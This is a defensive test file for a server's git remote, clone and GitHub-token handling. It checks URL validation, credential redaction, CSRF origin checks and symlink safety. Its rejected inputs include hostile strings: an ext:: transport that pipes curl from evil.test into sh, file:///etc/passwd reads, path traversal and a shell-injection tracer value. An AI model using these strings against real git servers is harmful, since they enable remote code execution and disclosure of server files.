/**
 * `git/remotes`, `git/remote`, and `git/clone` — connecting a project to a
 * repository, against REAL `git` in a real project directory inside
 * `projectsRootDir()` (same fixture posture as `git.test.ts`).
 *
 * **No case touches the network.** The clone tests clone from a LOCAL BARE
 * REPOSITORY the test creates, driven through `startGitCloneJob` with a parsed
 * remote whose `url` is swapped for that path — which is exactly the shape the
 * route produces, minus the transport.
 *
 * The rejections are the point, and there are two families:
 *
 *   1. **URL judgement** (`parseGithubRemoteUrl`). git's URL grammar contains
 *      transports that EXECUTE (`ext::sh -c …`) and transports that read this
 *      server's own disk (`file://`, a bare path). Those are the ones tested
 *      hardest.
 *   2. **The clone target.** Derived server-side, refuses an occupied
 *      directory rather than clearing it, and never accepts a caller-supplied
 *      path — there is no `dir` on that wire at all.
 */
import { afterAll, beforeEach, describe, expect, it } from 'bun:test'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { ProjectDirOutsideWorkspaceError, projectsRootDir } from '../studioProjects'
import { tryServeStudioGitRemote } from '../studio/gitRemoteRoutes'
import {
  cloneTargetDir,
  cloneTargetIsFree,
  clearGitCloneJobsForTest,
  readGitCloneJob,
  startGitCloneJob,
} from '../studio/gitClone'
import { githubProjectFolderName, parseGithubRemoteUrl, redactRemoteUrlCredentials } from '../studio/gitPaths'
import { isGitFailure, originAcceptsStoredGithubToken, pushCurrentBranch } from '../studio/gitOperations'
import { withOutsideWorkspaceDir } from './outsideWorkspaceDir'
import type { SubprocessSpawnFn } from '../studio/subprocessRunner'

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

async function git(cwd: string, args: string[]): Promise<number> {
  const proc = Bun.spawn(['git', ...args], { cwd, stdout: 'pipe', stderr: 'pipe', stdin: 'ignore' })
  await new Response(proc.stdout).text()
  await new Response(proc.stderr).text()
  return proc.exited
}

const created: string[] = []

function makeProjectDir(): string {
  const root = projectsRootDir()
  fs.mkdirSync(root, { recursive: true })
  const dir = fs.mkdtempSync(path.join(root, '__git_remote_test_'))
  created.push(dir)
  return dir
}

async function makeRepo(dir: string): Promise<void> {
  await git(dir, ['init', '--initial-branch=main'])
  await git(dir, ['config', 'user.email', 'studio-test@example.com'])
  await git(dir, ['config', 'user.name', 'Studio Test'])
  await git(dir, ['config', 'commit.gpgsign', 'false'])
  fs.writeFileSync(path.join(dir, 'README.md'), '# fixture\n')
  await git(dir, ['add', '-A'])
  await git(dir, ['commit', '-m', 'Initial commit'])
}

async function call(pathAndQuery: string, init?: RequestInit): Promise<Response> {
  const url = new URL(`http://localhost${pathAndQuery}`)
  const res = await tryServeStudioGitRemote(new Request(url, init), url, url.pathname)
  if (!res) throw new Error(`no route matched ${pathAndQuery}`)
  return res
}

function post(body: unknown): RequestInit {
  return { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }
}

/**
 * A POST carrying an `Origin`. It has to be set AFTER construction — `Origin`
 * is a forbidden header in the `Request` constructor, which is also why the
 * check is worth anything: a page cannot forge it, only the browser writes it.
 *
 * `text/plain` is what a cross-origin `<form>` can send, and the body parser
 * accepts it: the content type is not the control, the Origin check is.
 */
async function forged(pathAndQuery: string, body: unknown, origin: string): Promise<Response> {
  const url = new URL(`http://localhost${pathAndQuery}`)
  const req = new Request(url, {
    method: 'POST',
    headers: { 'content-type': 'text/plain' },
    body: JSON.stringify(body),
  })
  req.headers.set('origin', origin)
  const res = await tryServeStudioGitRemote(req, url, url.pathname)
  if (!res) throw new Error(`no route matched ${pathAndQuery}`)
  return res
}

afterAll(() => {
  for (const dir of created) fs.rmSync(dir, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------
// URL judgement — the widest-blast-radius input in the whole feature
// ---------------------------------------------------------------------------

describe('parseGithubRemoteUrl', () => {
  it('accepts the two GitHub shapes and normalizes both', () => {
    for (const input of [
      'https://github.com/octocat/hello-world',
      'https://github.com/octocat/hello-world/',
      'https://github.com/octocat/hello-world.git',
      'https://www.github.com/octocat/hello-world',
      '  https://github.com/octocat/hello-world  ',
    ]) {
      expect(parseGithubRemoteUrl(input)).toEqual({
        owner: 'octocat',
        repo: 'hello-world',
        url: 'https://github.com/octocat/hello-world.git',
        protocol: 'https',
      })
    }

    expect(parseGithubRemoteUrl('git@github.com:octocat/hello-world.git')).toEqual({
      owner: 'octocat',
      repo: 'hello-world',
      url: 'git@github.com:octocat/hello-world.git',
      protocol: 'ssh',
    })
  })

  it('refuses every transport that executes or reads this server', () => {
    for (const hostile of [
      'ext::sh -c "curl evil.test | sh"',
      'ext::git-upload-pack %S /etc',
      'file:///etc/passwd',
      'file://C:/Windows',
      '/etc/passwd',
      'C:\\Windows\\System32',
      '../../../../etc',
      'ssh://git@evil.test/owner/repo.git',
      'git://github.com/octocat/hello-world.git',
      'http://github.com/octocat/hello-world',
      'https://evil.test/octocat/hello-world',
      'https://github.com.evil.test/octocat/hello-world',
      'git@evil.test:octocat/hello-world.git',
    ]) {
      expect(parseGithubRemoteUrl(hostile)).toBeNull()
    }
  })

  it('refuses a URL carrying credentials, a query, or a fragment', () => {
    expect(parseGithubRemoteUrl('https://user:pass@github.com/octocat/hello-world')).toBeNull()
    expect(parseGithubRemoteUrl('https://token@github.com/octocat/hello-world')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world?x=1')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world#frag')).toBeNull()
  })

  it('refuses a path that is not exactly owner/repo', () => {
    expect(parseGithubRemoteUrl('https://github.com/octocat')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello-world/tree/main')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/..')).toBeNull()
  })

  it('refuses control characters, an empty value, and an absurd length', () => {
    expect(parseGithubRemoteUrl('')).toBeNull()
    expect(parseGithubRemoteUrl('   ')).toBeNull()
    expect(parseGithubRemoteUrl('https://github.com/octocat/hello\nworld')).toBeNull()
    expect(parseGithubRemoteUrl(`https://github.com/octocat/${'a'.repeat(600)}`)).toBeNull()
  })

  /**
   * `sec-13`, informational finding: `..` matches `[A-Za-z0-9_.-]+`, so the
   * SSH form accepted `git@github.com:../repo.git` and handed a `..` owner to
   * every string the pair is later composed into. The HTTPS form only ever
   * survived it by accident — `new URL` normalises `..` out of a pathname — so
   * both forms are driven here, and the HTTPS cases are the ones that prove
   * the RULE is now doing the work rather than the normalisation.
   */
  it('refuses a dots-only owner or repo in BOTH URL forms', () => {
    for (const hostile of [
      'git@github.com:../hello-world.git',
      'git@github.com:./hello-world.git',
      'git@github.com:.../hello-world.git',
      'git@github.com:octocat/...git',
      'git@github.com:octocat/.....git',
      'git@github.com:../...git',
      'https://github.com/../hello-world',
      'https://github.com/./hello-world',
      'https://github.com/octocat/..',
      'https://github.com/octocat/.',
      'https://github.com/%2e%2e/hello-world',
    ]) {
      expect(parseGithubRemoteUrl(hostile)).toBeNull()
    }
  })

  it('refuses an owner or repo GitHub itself could never issue', () => {
    for (const hostile of [
      // A leading `-` makes the derived `<owner>-<repo>` folder name argv-flag-shaped.
      'git@github.com:-octocat/hello-world.git',
      'https://github.com/-octocat/hello-world',
      'git@github.com:octocat/-hello-world.git',
      'https://github.com/octocat/-hello-world',
      // GitHub owners may not end in `-` either.
      'https://github.com/octocat-/hello-world',
      // GitHub's own ceilings: 39 for an owner, 100 for a repository.
      `https://github.com/${'a'.repeat(40)}/hello-world`,
      `https://github.com/octocat/${'a'.repeat(101)}`,
      `git@github.com:${'a'.repeat(40)}/hello-world.git`,
    ]) {
      expect(parseGithubRemoteUrl(hostile)).toBeNull()
    }
  })

  it('still accepts the legal names that LOOK like the rejected ones', () => {
    // `.github` is GitHub's own organisation-profile repository; a leading dot
    // on a repo is legal, only an all-dots segment is not.
    expect(parseGithubRemoteUrl('https://github.com/octocat/.github')).toEqual({
      owner: 'octocat',
      repo: '.github',
      url: 'https://github.com/octocat/.github.git',
      protocol: 'https',
    })
    expect(parseGithubRemoteUrl('git@github.com:octocat/.github.git')?.repo).toBe('.github')
    // Dots, underscores and inner hyphens inside a name are all fine.
    expect(parseGithubRemoteUrl('https://github.com/my-org/socket.io')?.repo).toBe('socket.io')
    expect(parseGithubRemoteUrl('https://github.com/my_org/hello_world')?.owner).toBe('my_org')
    // Exactly at the ceilings, not over them.
    expect(parseGithubRemoteUrl(`https://github.com/${'a'.repeat(39)}/${'b'.repeat(100)}`)?.owner).toBe('a'.repeat(39))
  })
})

// ---------------------------------------------------------------------------
// The routes
// ---------------------------------------------------------------------------

describe('git remote routes', () => {
  let dir: string

  beforeEach(async () => {
    dir = makeProjectDir()
    await makeRepo(dir)
    clearGitCloneJobsForTest()
  })

  it('connects origin, reports it back, and replaces it on a second connect', async () => {
    const empty = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    expect(await empty.json()).toEqual({ remotes: [] })

    const connected = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'origin', url: 'https://github.com/octocat/hello-world' } }),
    )
    expect(connected.status).toBe(200)
    // The URL that reached git is the RE-COMPOSED one, not the caller's string.
    expect(await connected.json()).toMatchObject({
      ok: true,
      remote: { name: 'origin', fetchUrl: 'https://github.com/octocat/hello-world.git' },
    })

    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string; pushUrl: string }> }
    expect(listed.remotes).toHaveLength(1)
    expect(listed.remotes[0]!.name).toBe('origin')

    const replaced = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'origin', url: 'git@github.com:octocat/other.git' } }),
    )
    expect(replaced.status).toBe(200)
    const after = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string; fetchUrl: string }> }
    expect(after.remotes).toHaveLength(1)
    expect(after.remotes[0]!.fetchUrl).toBe('git@github.com:octocat/other.git')
  })

  it('never reports a credential a repository cloned outside Studio carries', async () => {
    // `GET git/remotes` is a `site.read` route, so this is what the CLIENT
    // role would otherwise be able to read out of an imported repository.
    // `x-access-token:<token>` is what a GitHub Actions checkout leaves in
    // `.git/config`; the bare-token form is what a token-pasted `git clone`
    // leaves. `sec-16` reported this; `sec-18` closed it.
    await git(dir, ['remote', 'add', 'ci', 'https://x-access-token:ghp_NotARealToken1234@github.com/o/r.git'])
    await git(dir, ['remote', 'add', 'pasted', 'https://ghp_AlsoNotReal5678@github.com/o/r.git'])
    await git(dir, ['remote', 'add', 'ssh', 'ssh://git@github.com/o/r.git'])

    const res = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    const body = await res.text()
    expect(body).not.toContain('ghp_NotARealToken1234')
    expect(body).not.toContain('ghp_AlsoNotReal5678')
    expect(body).not.toContain('x-access-token')

    const listed = JSON.parse(body) as { remotes: Array<{ name: string; fetchUrl: string; pushUrl: string }> }
    const by = (name: string) => listed.remotes.find((remote) => remote.name === name)!
    expect(by('ci').fetchUrl).toBe('https://github.com/o/r.git')
    expect(by('ci').pushUrl).toBe('https://github.com/o/r.git')
    expect(by('pasted').fetchUrl).toBe('https://github.com/o/r.git')
    // `git@` on an SSH remote is the ACCOUNT, not a secret — stripping it
    // would make the panel disagree with the user's terminal.
    expect(by('ssh').fetchUrl).toBe('ssh://git@github.com/o/r.git')
  })

  it('reports remotes Studio did not write, rather than hiding them', async () => {
    await git(dir, ['remote', 'add', 'upstream', 'https://github.com/someone/else.git'])
    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: Array<{ name: string }> }
    expect(listed.remotes.map((remote) => remote.name)).toEqual(['upstream'])
  })

  it('refuses every hostile URL with a 400, and writes nothing', async () => {
    for (const hostile of [
      'ext::sh -c "id"',
      'file:///etc/passwd',
      '/etc/passwd',
      'https://evil.test/a/b',
      'http://github.com/a/b',
      'https://user:pass@github.com/a/b',
    ]) {
      const res = await call('/admin/api/studio/git/remote', post({ dir, set: { name: 'origin', url: hostile } }))
      expect(res.status).toBe(400)
    }
    const listed = (await (
      await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    ).json()) as { remotes: unknown[] }
    expect(listed.remotes).toEqual([])
  })

  it('rejects a remote name other than origin at the SCHEMA, not in a branch', async () => {
    const res = await call(
      '/admin/api/studio/git/remote',
      post({ dir, set: { name: 'upstream', url: 'https://github.com/octocat/hello-world' } }),
    )
    expect(res.status).toBe(400)
  })

  it('refuses a dir outside the workspace, and 404s a dir with no repository of its own', async () => {
    await withOutsideWorkspaceDir('git-remote-routes', async (outside) => {
      // Since W10 the containment refusal is a THROW from `resolveProjectDir`,
      // turned into the router's single 404 — see `outsideWorkspaceDir.ts`.
      await expect(
        call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(outside)}`),
      ).rejects.toBeInstanceOf(ProjectDirOutsideWorkspaceError)
      await expect(
        call(
          '/admin/api/studio/git/remote',
          post({ dir: outside, set: { name: 'origin', url: 'https://github.com/octocat/hello-world' } }),
        ),
      ).rejects.toBeInstanceOf(ProjectDirOutsideWorkspaceError)
    })

    // Inside the workspace, but with no `.git` of its own — without the guard
    // this would resolve to STUDIO'S OWN repository and report its remotes.
    const bare = makeProjectDir()
    const res = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(bare)}`)
    expect(res.status).toBe(404)
  })

  it('rejects a malformed body', async () => {
    expect((await call('/admin/api/studio/git/remote', post({ dir }))).status).toBe(400)
    expect((await call('/admin/api/studio/git/remote', post({ dir, set: { url: 'x' } }))).status).toBe(400)
  })
})

// ---------------------------------------------------------------------------
// Clone
// ---------------------------------------------------------------------------

describe('git clone', () => {
  beforeEach(() => {
    clearGitCloneJobsForTest()
  })

  it('derives the target from the parsed owner/repo, never from a caller value', () => {
    const remote = parseGithubRemoteUrl('https://github.com/octocat/hello-world')!
    expect(githubProjectFolderName(remote)).toBe('octocat-hello-world')
    expect(cloneTargetDir(remote)).toBe(path.resolve(projectsRootDir(), 'octocat-hello-world'))
  })

  it('refuses a clone whose target directory already exists, without touching it', async () => {
    const remote = parseGithubRemoteUrl('https://github.com/studio-test/occupied')!
    const target = cloneTargetDir(remote)
    fs.mkdirSync(target, { recursive: true })
    created.push(target)
    fs.writeFileSync(path.join(target, 'precious.txt'), 'the user\u2019s only copy')

    const res = await call('/admin/api/studio/git/clone', post({ url: 'https://github.com/studio-test/occupied' }))
    expect(res.status).toBe(409)
    expect(((await res.json()) as { code: string }).code).toBe('project-exists')
    // Studio never clears a project directory to make room for a clone.
    expect(fs.readFileSync(path.join(target, 'precious.txt'), 'utf8')).toBe('the user\u2019s only copy')
  })

  it('refuses a hostile clone URL with a 400 before any job exists', async () => {
    for (const hostile of ['ext::sh -c "id"', 'file:///etc', '/etc/passwd', 'https://evil.test/a/b']) {
      const res = await call('/admin/api/studio/git/clone', post({ url: hostile }))
      expect(res.status).toBe(400)
    }
  })

  it('has no dir field on its wire — an extra one changes nothing', async () => {
    const hijack = path.join(os.tmpdir(), 'studio-clone-hijack')
    const res = await call(
      '/admin/api/studio/git/clone',
      post({ url: 'https://github.com/studio-test/ignored-dir', dir: hijack }),
    )
    // The body schema has no `dir`, so `readValidatedBody` rejects the extra
    // property outright — the target can never come from a request.
    expect(res.status).toBe(400)
    expect(fs.existsSync(hijack)).toBe(false)
  })

  it('answers 404 for a clone status poll with an unknown job id, and 400 with none', async () => {
    expect((await call('/admin/api/studio/git/clone/status?jobId=made-up')).status).toBe(404)
    expect((await call('/admin/api/studio/git/clone/status')).status).toBe(400)
  })

  /**
   * Neither route reads a session, so no cookie's SameSite flag defends them,
   * and `readValidatedBody` calls `req.json()` whatever the content type says
   * — a cross-origin `<form enctype="text/plain">` reaches both. A forged
   * `remote` repoints `origin` at somebody else's repository (the next push
   * then offers it the user's GitHub token); a forged `clone` makes this
   * server fetch a repository into their workspace.
   */
  it('refuses a forged remote/clone from another origin, and leaves origin alone', async () => {
    const dir = makeProjectDir()
    await makeRepo(dir)

    const forge = (pathAndQuery: string, body: unknown) => forged(pathAndQuery, body, 'https://evil.test')

    const remote = await forge('/admin/api/studio/git/remote', {
      dir,
      set: { name: 'origin', url: 'https://github.com/evil/payload' },
    })
    expect(remote.status).toBe(403)
    expect(((await remote.json()) as { error: string }).error).not.toContain(dir)

    expect((await forge('/admin/api/studio/git/clone', { url: 'https://github.com/evil/payload' })).status).toBe(403)

    // No remote was written, and no project directory was created for it.
    const remotes = await call(`/admin/api/studio/git/remotes?dir=${encodeURIComponent(dir)}`)
    expect(((await remotes.json()) as { remotes: unknown[] }).remotes).toEqual([])
    expect(fs.existsSync(cloneTargetDir({ owner: 'evil', repo: 'payload', url: '', protocol: 'https' }))).toBe(false)
  })

  it('still admits the panel\'s own origin, and a client that sends none', async () => {
    const dir = makeProjectDir()
    await makeRepo(dir)

    const fromPanel = await forged(
      '/admin/api/studio/git/remote',
      { dir, set: { name: 'origin', url: 'https://github.com/acme/storefront' } },
      'http://localhost',
    )
    expect(fromPanel.status).toBe(200)

    // No Origin header is not a browser, so it is not CSRF.
    expect(
      (await call('/admin/api/studio/git/remote', post({ dir, set: { name: 'origin', url: 'https://github.com/acme/other' } })))
        .status,
    ).toBe(200)
  })

  it('clones a real repository, keeping its history, and ends on an import summary', async () => {
    // A local bare repository stands in for GitHub: a real `git clone` over
    // git's own transport, with no network and no credentials.
    const source = makeProjectDir()
    await makeRepo(source)
    const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-origin-'))
    created.push(bare)
    await git(bare, ['init', '--bare', '--initial-branch=main'])
    await git(source, ['remote', 'add', 'origin', bare])
    await git(source, ['push', '--set-upstream', 'origin', 'main'])

    // The shape the route produces, with the transport swapped for the bare
    // path — everything downstream of `parseGithubRemoteUrl` is identical.
    const remote = { owner: 'studio-test', repo: 'cloned', url: bare, protocol: 'https' as const }
    const target = cloneTargetDir(remote)
    created.push(target)

    const job = startGitCloneJob(remote, undefined)
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(job.id)!
    expect(finished.error).toBeNull()
    expect(finished.phase).toBe('done')
    expect(finished.summary?.dir).toBe(target)

    // The history came with it — that is the whole point of this path.
    expect(fs.existsSync(path.join(target, '.git'))).toBe(true)
    const log = Bun.spawnSync(['git', 'log', '--format=%s'], { cwd: target })
    expect(log.stdout.toString()).toContain('Initial commit')
    // …and so did `origin`, so the panel's Push is live immediately.
    const remotes = Bun.spawnSync(['git', 'remote'], { cwd: target })
    expect(remotes.stdout.toString().trim()).toBe('origin')
  })

  it('refuses a second clone into a target a running job owns, and does not touch its work', async () => {
    const source = makeProjectDir()
    await makeRepo(source)
    const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-origin-race-'))
    created.push(bare)
    await git(bare, ['init', '--bare', '--initial-branch=main'])
    await git(source, ['remote', 'add', 'origin', bare])
    await git(source, ['push', '--set-upstream', 'origin', 'main'])

    const remote = { owner: 'studio-test', repo: 'raced', url: bare, protocol: 'https' as const }
    const target = cloneTargetDir(remote)
    created.push(target)

    expect(cloneTargetIsFree(remote)).toBe(true)
    const first = startGitCloneJob(remote, undefined)

    // `git clone` is what creates the directory, so the target does not exist
    // yet — "is it free?" has to answer no on the RESERVATION, not on disk.
    expect(fs.existsSync(target)).toBe(false)
    expect(cloneTargetIsFree(remote)).toBe(false)

    // …and a caller that starts one anyway is refused rather than racing into
    // the same directory and deleting the winner's clone on its own cleanup.
    const second = startGitCloneJob(remote, undefined)
    expect(second.phase).toBe('failed')
    expect(second.error).toMatch(/already running/)

    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(first.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(first.id)!
    expect(finished.error).toBeNull()
    expect(finished.phase).toBe('done')
    // The loser's cleanup did not take the winner's project with it.
    expect(fs.existsSync(path.join(target, '.git'))).toBe(true)
  }, 90_000)

  it('leaves no partial project behind when the clone fails', async () => {
    const remote = {
      owner: 'studio-test',
      repo: 'nonexistent',
      url: path.join(os.tmpdir(), 'studio-clone-source-that-does-not-exist'),
      protocol: 'https' as const,
    }
    const target = cloneTargetDir(remote)

    const job = startGitCloneJob(remote, undefined)
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(job.id)!
    expect(finished.phase).toBe('failed')
    expect(finished.error).toBeTruthy()
    expect(fs.existsSync(target)).toBe(false)
  })

  // A repository that commits `.studio/shares.json` hands its author a share
  // token that resolves on THIS server's public route, and "Update" would
  // photograph the user's board into it. The clone keeps the board, drops shares.
  it('drops a cloned repository’s share records and snapshots, and keeps its board', async () => {
    const source = makeProjectDir()
    await makeRepo(source)
    const token = `shr_${'A'.repeat(43)}`
    fs.mkdirSync(path.join(source, '.studio', 'shares', token), { recursive: true })
    fs.writeFileSync(
      path.join(source, '.studio', 'shares.json'),
      JSON.stringify({ version: 1, shares: [{ token, boardId: 'b1', boardName: 'B', createdAt: 'x', snapshotAt: 'x', frameCount: 0 }] }),
    )
    fs.writeFileSync(path.join(source, '.studio', 'shares', token, 'board.json'), '{}')
    fs.writeFileSync(path.join(source, '.studio', 'boards.json'), '{"version":1,"boards":[]}')
    await git(source, ['add', '-A'])
    await git(source, ['commit', '-m', 'studio state'])
    const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-origin-shares-'))
    created.push(bare)
    await git(bare, ['init', '--bare', '--initial-branch=main'])
    await git(source, ['remote', 'add', 'origin', bare])
    await git(source, ['push', '--set-upstream', 'origin', 'main'])

    const remote = { owner: 'studio-test', repo: 'shared-state', url: bare, protocol: 'https' as const }
    const target = cloneTargetDir(remote)
    created.push(target)
    const job = startGitCloneJob(remote, undefined)
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    expect(readGitCloneJob(job.id)!.phase).toBe('done')
    expect(fs.existsSync(path.join(target, '.studio', 'shares.json'))).toBe(false)
    expect(fs.existsSync(path.join(target, '.studio', 'shares'))).toBe(false)
    expect(fs.readFileSync(path.join(target, '.studio', 'boards.json'), 'utf8')).toBe('{"version":1,"boards":[]}')
  })

  // A hostile repository ships `.studio` as a link (git stores symlinks). The
  // clone's own meta write — its first `.studio` write — used to land wherever
  // it pointed. Windows git checks a link out as text unless `core.symlinks`
  // is on, so the link is planted by the spawn seam the moment git exits:
  // exactly the tree a POSIX clone of that repository produces.
  it('removes a cloned .studio that is a link before writing a record, and touches nothing it pointed at', async () => {
    const source = makeProjectDir()
    await makeRepo(source)
    const bare = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-origin-linked-'))
    created.push(bare)
    await git(bare, ['init', '--bare', '--initial-branch=main'])
    await git(source, ['remote', 'add', 'origin', bare])
    await git(source, ['push', '--set-upstream', 'origin', 'main'])

    const victim = fs.mkdtempSync(path.join(os.tmpdir(), 'studio-clone-victim-'))
    created.push(victim)
    const planted = JSON.stringify({ trust: 'run-project' })
    fs.writeFileSync(path.join(victim, 'meta.json'), planted)

    const remote = { owner: 'studio-test', repo: 'linked-studio', url: bare, protocol: 'https' as const }
    const target = cloneTargetDir(remote)
    created.push(target)
    const spawn: SubprocessSpawnFn = (argv, options) => {
      const proc = Bun.spawn(argv, options)
      const exited = proc.exited.then((code) => {
        if (code === 0 && argv.includes('clone')) fs.symlinkSync(victim, path.join(target, '.studio'), 'junction')
        return code
      })
      return { stdout: proc.stdout, stderr: proc.stderr, exited, pid: proc.pid }
    }

    const job = startGitCloneJob(remote, undefined, { spawn })
    const deadline = Date.now() + 60_000
    while (Date.now() < deadline) {
      const current = readGitCloneJob(job.id)
      if (current && (current.phase === 'done' || current.phase === 'failed')) break
      await Bun.sleep(50)
    }

    const finished = readGitCloneJob(job.id)!
    expect(finished.error).toBeNull()
    expect(finished.phase).toBe('done')
    // Studio's own record is a real folder in the project now…
    expect(fs.lstatSync(path.join(target, '.studio')).isSymbolicLink()).toBe(false)
    expect(JSON.parse(fs.readFileSync(path.join(target, '.studio', 'meta.json'), 'utf8')).displayName).toBe('linked-studio')
    // …and what the link pointed at was never written.
    expect(fs.readFileSync(path.join(victim, 'meta.json'), 'utf8')).toBe(planted)
    expect(fs.readdirSync(victim)).toEqual(['meta.json'])
  })
})

// ---------------------------------------------------------------------------
// Which remote may see the stored token
//
// `GIT_ASKPASS` answers whatever host git dialled — the script is handed a
// prompt string, not a destination it can refuse. So "may this remote see the
// token" has to be decided BEFORE the script exists, and `origin` is not
// always Studio's: a project can arrive with a `.git` the user pointed at a
// company host, a mirror, or an `ext::` transport in their own terminal.
// ---------------------------------------------------------------------------

describe('a stored GitHub token is only ever offered to github.com', () => {
  /**
   * A value `isEmbeddableGitToken` refuses, used as a TRACER. `runGit` writes
   * the askpass script before it spawns anything, so reaching that write
   * throws — which makes "was the credential forwarded?" observable without a
   * network, a real token, or a stub.
   */
  const UNUSABLE_TRACER = "not-a-token'; id #"

  async function repoWithOrigin(url: string): Promise<string> {
    const dir = makeProjectDir()
    await makeRepo(dir)
    await git(dir, ['remote', 'add', 'origin', url])
    return dir
  }

  it('accepts a github.com origin and refuses every other one', async () => {
    expect(await originAcceptsStoredGithubToken(await repoWithOrigin('https://github.com/octocat/hello-world.git'))).toBe(true)
    expect(await originAcceptsStoredGithubToken(await repoWithOrigin('git@github.com:octocat/hello-world.git'))).toBe(true)

    for (const hostile of [
      'https://gitlab.example.com/octocat/hello-world.git',
      'https://github.com.evil.test/octocat/hello-world.git',
      'http://github.com/octocat/hello-world.git',
      'https://user:pass@github.com/octocat/hello-world.git',
      'ssh://git@evil.test/octocat/hello-world.git',
      path.join(os.tmpdir(), 'some-local-mirror.git'),
    ]) {
      expect(await originAcceptsStoredGithubToken(await repoWithOrigin(hostile))).toBe(false)
    }

    // No `origin` at all is also "no".
    const bare = makeProjectDir()
    await makeRepo(bare)
    expect(await originAcceptsStoredGithubToken(bare)).toBe(false)
  }, 120_000)

  it('forwards the credential for a github.com origin', async () => {
    const dir = await repoWithOrigin('https://github.com/octocat/hello-world.git')
    await expect(pushCurrentBranch(dir, { credential: UNUSABLE_TRACER })).rejects.toThrow(
      /not in a format Studio can use/,
    )
  }, 60_000)

  it('drops it for an origin Studio did not write, and never mentions it in the failure', async () => {
    const dir = await repoWithOrigin(path.join(os.tmpdir(), 'studio-review-not-a-repository'))

    // No throw: the tracer never reached `writeAskpassScript`, so no script
    // carrying a credential was ever created for this remote.
    const result = await pushCurrentBranch(dir, { credential: UNUSABLE_TRACER })
    expect(isGitFailure(result)).toBe(true)
    expect(JSON.stringify(result)).not.toContain('not-a-token')
  }, 60_000)
})

describe('redactRemoteUrlCredentials', () => {
  it.each([
    // http/https — the WHOLE userinfo goes, because a token with no password
    // half is the commonest credential shape there.
    ['https://x-access-token:ghp_NotAReal@github.com/o/r.git', 'https://github.com/o/r.git'],
    ['https://ghp_NotAReal@github.com/o/r.git', 'https://github.com/o/r.git'],
    ['http://user:pw@example.test/o/r.git', 'http://example.test/o/r.git'],
    ['HTTPS://user:pw@github.com/o/r.git', 'HTTPS://github.com/o/r.git'],
    ['https://user:pw@github.com:8443/o/r.git?x=1#f', 'https://github.com:8443/o/r.git?x=1#f'],
    ['https://user:p%40ss@github.com/o/r.git', 'https://github.com/o/r.git'],
    // A userinfo containing an `@` splits on the LAST one, as a URL parser does.
    ['https://us@er:pw@github.com/o/r.git', 'https://github.com/o/r.git'],
    // Non-http: only the password half goes; the account stays.
    ['ssh://git:secret@github.com/o/r.git', 'ssh://git@github.com/o/r.git'],
  ])('redacts %s', (input, expected) => {
    expect(redactRemoteUrlCredentials(input)).toBe(expected)
  })

  it.each([
    'https://github.com/o/r.git',
    'ssh://git@github.com/o/r.git',
    // scp-like: no `scheme://`, so no userinfo syntax to strip.
    'git@github.com:o/r.git',
    'git@github.com:o/r@weird.git',
    '/a/local/path',
    'C:/a/windows/path',
    '',
  ])('leaves %s untouched', (input) => {
    expect(redactRemoteUrlCredentials(input)).toBe(input)
  })
})
